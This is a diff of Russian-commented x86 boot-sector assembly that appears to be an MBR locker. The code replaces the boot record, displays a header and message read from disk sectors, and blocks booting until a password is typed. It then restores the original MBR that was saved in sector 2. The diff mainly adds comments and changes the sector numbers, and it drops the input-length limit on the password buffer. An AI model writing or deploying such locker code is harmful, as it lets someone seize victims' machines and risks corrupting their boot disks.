@@ -11,9 +11,11 @@ start:
     mov sp, 0x7C00
     sti
 
+    ; УСТАНОВКА ВИДЕОРЕЖИМА 80x25
     mov ax, 0x0003
     int 0x10
 
+    ; ОЧИСТКА ЭКРАНА
     mov ah, 0x06
     mov al, 0
     mov bh, 0x00
@@ -21,31 +23,36 @@ start:
     mov dx, 0x184F
     int 0x10
 
-    ; ЗАГРУЗКА ШРИФТА (СЕКТОРА 3-4)
+    ; =============================================
+    ; ЗАГРУЗКА ПОЛНОГО ШРИФТА (СЕКТОРЫ 3-10)
+    ; =============================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 2
+    mov al, 8               ; 8 СЕКТОРОВ = 4096 БАЙТ
     mov ch, 0
-    mov cl, 3
+    mov cl, 3               ; НАЧИНАЯ С СЕКТОРА 3
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
+    ; ЗАГРУЗКА ШРИФТА В BIOS
     mov ax, 0x1100
     mov bx, 0x0100
     int 0x10
 
-    ; ЗАГРУЗКА ЗАГОЛОВКА (СЕКТОР 5)
+    ; =============================================
+    ; ЗАГРУЗКА ЗАГОЛОВКА (СЕКТОР 11)
+    ; =============================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9000
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 5
+    mov cl, 11
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -54,14 +61,16 @@ start:
     mov si, 0x9000
     call print
 
-    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 6)
+    ; =============================================
+    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 12)
+    ; =============================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9200
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 6
+    mov cl, 12
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -70,6 +79,7 @@ start:
     mov si, 0x9200
     call print
 
+    ; КУРСОР ВНИЗ
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
@@ -84,7 +94,7 @@ password_loop:
     call check_password
     cmp byte [password_ok], 1
     je restore_and_boot
-    
+
     mov si, msg_wrong
     call print
 
@@ -105,6 +115,9 @@ restore_and_boot:
     call restore_mbr
     jmp load_os
 
+; =============================================
+; ВОССТАНОВЛЕНИЕ MBR ИЗ СЕКТОРА 2
+; =============================================
 restore_mbr:
     pusha
     mov ax, 0x0000
@@ -136,6 +149,9 @@ restore_mbr:
 load_os:
     jmp 0x0000:0x7C00
 
+; =============================================
+; ВЫВОД СТРОКИ НА ЭКРАН
+; =============================================
 print:
     lodsb
     or al, al
@@ -148,9 +164,11 @@ print:
 .done:
     ret
 
+; =============================================
+; ВВОД ПАРОЛЯ
+; =============================================
 get_password:
     mov di, buffer
-    mov cx, 64
 .loop:
     xor ax, ax
     int 0x16
@@ -166,7 +184,7 @@ get_password:
     mov ah, 0x0E
     mov bh, 0x00
     mov bl, 0x07
-    mov al, [di - 1]    ; ← ОТОБРАЖАЕМ ВВЕДЕННЫЙ СИМВОЛ (ОРИГИНАЛЬНОЕ ПОВЕДЕНИЕ)
+    mov al, [di - 1]
     int 0x10
     jmp .loop
 .backspace:
@@ -194,6 +212,9 @@ get_password:
     int 0x10
     ret
 
+; =============================================
+; ПРОВЕРКА ПАРОЛЯ
+; =============================================
 check_password:
     mov si, buffer
     mov di, password
@@ -201,7 +222,7 @@ check_password:
     lodsb
     or al, al
     jz .check_end
-    cmp al, [di]        ; ← ИСПРАВЛЕННАЯ ВЕРСИЯ (РАБОТАЕТ)
+    cmp al, [di]
     jne .fail
     inc di
     jmp .compare
